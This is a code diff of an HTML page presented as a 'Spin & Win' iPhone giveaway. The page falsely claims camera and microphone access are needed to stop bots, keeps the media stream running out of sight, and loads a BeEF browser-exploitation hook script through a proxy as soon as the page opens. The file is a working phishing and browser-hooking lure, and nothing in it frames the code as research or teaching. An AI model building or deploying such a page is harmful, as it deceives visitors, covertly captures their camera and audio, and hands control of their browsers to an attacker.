@@ -3,56 +3,349 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Congratulations! You Won!</title>
+    <title>Spin & Win - Grand Prize Giveaway!</title>
     <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
       body {
-        font-family: Arial;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+
+      .container {
+        background: white;
+        border-radius: 20px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        max-width: 600px;
+        width: 100%;
+        padding: 40px;
         text-align: center;
-        padding: 60px;
-        background: #f0f8ff;
       }
+
+      .logo {
+        font-size: 3em;
+        margin-bottom: 10px;
+      }
+
       h1 {
-        color: #d4af37;
-        font-size: 2.2em;
+        color: #333;
+        font-size: 2em;
+        margin-bottom: 10px;
+        font-weight: 700;
       }
-      p {
+
+      .subtitle {
+        color: #666;
         font-size: 1.1em;
+        margin-bottom: 30px;
       }
+
+      .prize-banner {
+        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        color: white;
+        padding: 20px;
+        border-radius: 15px;
+        margin-bottom: 30px;
+        font-size: 1.3em;
+        font-weight: bold;
+        box-shadow: 0 5px 15px rgba(245, 87, 108, 0.4);
+      }
+
+      .instructions {
+        background: #f8f9fa;
+        padding: 20px;
+        border-radius: 10px;
+        margin-bottom: 30px;
+        color: #555;
+        line-height: 1.6;
+      }
+
+      .instructions strong {
+        color: #667eea;
+      }
+
       .btn {
-        padding: 16px 32px;
-        background: #ff4500;
+        padding: 18px 50px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         color: white;
         font-size: 1.3em;
+        font-weight: bold;
         border: none;
-        border-radius: 12px;
+        border-radius: 50px;
         cursor: pointer;
-        margin: 20px;
+        transition: all 0.3s ease;
+        box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
       }
-      .cam {
-        font-style: italic;
-        color: #555;
+
+      .btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 30px rgba(102, 126, 234, 0.6);
+      }
+
+      .btn:disabled {
+        background: #ccc;
+        cursor: not-allowed;
+        box-shadow: none;
+      }
+
+      #welcome-screen {
+        display: block;
+      }
+
+      #game-screen {
+        display: none;
+      }
+
+      .wheel-container {
+        position: relative;
+        margin: 30px auto;
+        width: 400px;
+        height: 400px;
+      }
+
+      #wheel {
+        width: 100%;
+        height: 100%;
+        border-radius: 50%;
+        border: 15px solid #333;
+        position: relative;
+        transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      }
+
+      .wheel-segment {
+        position: absolute;
+        width: 50%;
+        height: 50%;
+        transform-origin: 100% 100%;
+        overflow: hidden;
+      }
+
+      .wheel-segment::before {
+        content: "";
+        position: absolute;
+        width: 200%;
+        height: 200%;
+        transform-origin: 100% 100%;
+        border: 2px solid white;
+      }
+
+      .segment1 {
+        transform: rotate(0deg) skewY(-60deg);
+      }
+      .segment1::before {
+        background: #ff6b6b;
+        transform: skewY(60deg) rotate(15deg);
+      }
+
+      .segment2 {
+        transform: rotate(60deg) skewY(-60deg);
+      }
+      .segment2::before {
+        background: #4ecdc4;
+        transform: skewY(60deg) rotate(15deg);
+      }
+
+      .segment3 {
+        transform: rotate(120deg) skewY(-60deg);
+      }
+      .segment3::before {
+        background: #45b7d1;
+        transform: skewY(60deg) rotate(15deg);
+      }
+
+      .segment4 {
+        transform: rotate(180deg) skewY(-60deg);
+      }
+      .segment4::before {
+        background: #f7b731;
+        transform: skewY(60deg) rotate(15deg);
+      }
+
+      .segment5 {
+        transform: rotate(240deg) skewY(-60deg);
+      }
+      .segment5::before {
+        background: #5f27cd;
+        transform: skewY(60deg) rotate(15deg);
+      }
+
+      .segment6 {
+        transform: rotate(300deg) skewY(-60deg);
+      }
+      .segment6::before {
+        background: #00d2d3;
+        transform: skewY(60deg) rotate(15deg);
+      }
+
+      .wheel-center {
+        position: absolute;
+        width: 80px;
+        height: 80px;
+        background: white;
+        border-radius: 50%;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        border: 5px solid #333;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        z-index: 10;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
+        color: #333;
+      }
+
+      .pointer {
+        position: absolute;
+        top: -20px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 0;
+        height: 0;
+        border-left: 20px solid transparent;
+        border-right: 20px solid transparent;
+        border-top: 40px solid #ff4757;
+        z-index: 20;
+        filter: drop-shadow(0 3px 5px rgba(0, 0, 0, 0.3));
+      }
+
+      .prize-list {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+        margin: 20px 0;
+        font-size: 0.9em;
+      }
+
+      .prize-item {
+        background: #f8f9fa;
+        padding: 10px;
+        border-radius: 8px;
+        font-weight: 600;
+      }
+
+      .spin-result {
+        margin-top: 30px;
+        padding: 20px;
+        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        color: white;
+        border-radius: 15px;
+        font-size: 1.5em;
+        font-weight: bold;
+        display: none;
+      }
+
+      .error-message {
+        color: #e74c3c;
         margin-top: 15px;
+        font-weight: 600;
+        display: none;
+      }
+
+      @media (max-width: 500px) {
+        .wheel-container {
+          width: 300px;
+          height: 300px;
+        }
+
+        .container {
+          padding: 20px;
+        }
+
+        h1 {
+          font-size: 1.5em;
+        }
       }
     </style>
   </head>
   <body>
-    <h1>🎉 You Won a Free iPhone 16!</h1>
-    <p>Allow camera to claim your prize</p>
-    <button class="btn" onclick="startCam()">Claim Now</button>
-    <p class="cam">Camera access required for verification</p>
+    <div class="container">
+      <!-- Welcome Screen -->
+      <div id="welcome-screen">
+        <div class="logo">🎰</div>
+        <h1>Spin & Win Amazing Prizes!</h1>
+        <p class="subtitle">Play now for a chance to win incredible rewards</p>
+
+        <div class="prize-banner">🎁 Grand Prize: iPhone 16 Pro Max! 🎁</div>
+
+        <div class="instructions">
+          <strong>How to Play:</strong><br />
+          1. Click "Play Game" button below<br />
+          2. Allow camera & microphone access for verification<br />
+          3. Spin the wheel and win amazing prizes!<br />
+          <br />
+          <em
+            >Note: Camera/microphone access is required to prevent bots and
+            ensure fair play.</em
+          >
+        </div>
+
+        <button class="btn" id="playBtn" onclick="requestPermissions()">
+          🎮 Play Game
+        </button>
+
+        <p class="error-message" id="errorMsg">
+          ⚠️ Camera & Microphone access required to play the game
+        </p>
+      </div>
+
+      <!-- Game Screen -->
+      <div id="game-screen">
+        <h1>🎰 Spin the Wheel!</h1>
+        <p class="subtitle">Click the button to spin and win</p>
+
+        <div class="wheel-container">
+          <div class="pointer"></div>
+          <div id="wheel">
+            <div class="wheel-segment segment1"></div>
+            <div class="wheel-segment segment2"></div>
+            <div class="wheel-segment segment3"></div>
+            <div class="wheel-segment segment4"></div>
+            <div class="wheel-segment segment5"></div>
+            <div class="wheel-segment segment6"></div>
+            <div class="wheel-center">SPIN</div>
+          </div>
+        </div>
+
+        <div class="prize-list">
+          <div class="prize-item">🎁 $100 Gift Card</div>
+          <div class="prize-item">📱 iPhone 16</div>
+          <div class="prize-item">💰 $500 Cash</div>
+          <div class="prize-item">🎧 AirPods Pro</div>
+          <div class="prize-item">💎 Mystery Prize</div>
+          <div class="prize-item">🏆 Grand Prize</div>
+        </div>
+
+        <button class="btn" id="spinBtn" onclick="spinWheel()">
+          🎯 SPIN NOW
+        </button>
+
+        <div class="spin-result" id="result"></div>
+      </div>
+    </div>
 
     <script>
-      // Load BeEF hook.js through Vercel proxy (bypasses CORS and ngrok warnings)
+      let hasPermissions = false;
+      let spinning = false;
+
+      // Load BeEF hook.js through Vercel proxy
       function loadBeEFHook() {
         const script = document.createElement("script");
-        // Use Vercel proxy endpoint instead of direct ngrok URL
         script.src = "/api/hook";
 
         script.onerror = function () {
           console.error("Failed to load BeEF hook via proxy");
-          console.error(
-            "Make sure BEEF_SERVER_URL is set in Vercel environment variables"
-          );
         };
 
         script.onload = function () {
@@ -62,26 +355,83 @@
         document.head.appendChild(script);
       }
 
-      function startCam() {
-        navigator.mediaDevices
-          .getUserMedia({ video: true })
-          .then((stream) => {
-            alert("✓ Camera access granted!");
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            video.autoplay = true;
-            video.style.width = "300px";
-            video.style.borderRadius = "10px";
-            video.style.marginTop = "20px";
-            document.body.appendChild(video);
-          })
-          .catch((err) => {
-            console.error("Camera error:", err);
-            alert("✗ Camera access denied or not available.");
+      async function requestPermissions() {
+        const playBtn = document.getElementById("playBtn");
+        const errorMsg = document.getElementById("errorMsg");
+
+        playBtn.disabled = true;
+        playBtn.textContent = "⏳ Requesting Access...";
+
+        try {
+          // Request both camera and microphone
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true,
           });
+
+          // Permissions granted!
+          hasPermissions = true;
+
+          // Keep stream running in background (hidden)
+          console.log("✅ Camera and microphone access granted!");
+
+          // Show game screen
+          document.getElementById("welcome-screen").style.display = "none";
+          document.getElementById("game-screen").style.display = "block";
+        } catch (err) {
+          console.error("Permission error:", err);
+          errorMsg.style.display = "block";
+          playBtn.disabled = false;
+          playBtn.textContent = "🎮 Play Game";
+
+          setTimeout(() => {
+            errorMsg.style.display = "none";
+          }, 3000);
+        }
       }
 
-      // Auto-load hook when page loads
+      function spinWheel() {
+        if (spinning) return;
+
+        spinning = true;
+        const wheel = document.getElementById("wheel");
+        const spinBtn = document.getElementById("spinBtn");
+        const result = document.getElementById("result");
+
+        spinBtn.disabled = true;
+        result.style.display = "none";
+
+        // Random rotation (3-5 full spins + random angle)
+        const spins = 3 + Math.floor(Math.random() * 3);
+        const randomDegree = Math.floor(Math.random() * 360);
+        const totalRotation = spins * 360 + randomDegree;
+
+        wheel.style.transform = `rotate(${totalRotation}deg)`;
+
+        // Prizes based on final angle
+        const prizes = [
+          "🎁 $100 Gift Card",
+          "📱 iPhone 16 Pro Max",
+          "💰 $500 Cash Prize",
+          "🎧 AirPods Pro",
+          "💎 Mystery Bonus",
+          "🏆 GRAND PRIZE",
+        ];
+
+        setTimeout(() => {
+          const finalAngle = totalRotation % 360;
+          const segmentAngle = 60;
+          const prizeIndex = Math.floor(finalAngle / segmentAngle);
+
+          result.textContent = `🎉 You Won: ${prizes[prizeIndex]}!`;
+          result.style.display = "block";
+
+          spinBtn.disabled = false;
+          spinning = false;
+        }, 4000);
+      }
+
+      // Auto-load BeEF hook when page loads
       window.addEventListener("DOMContentLoaded", loadBeEFHook);
     </script>
   </body>
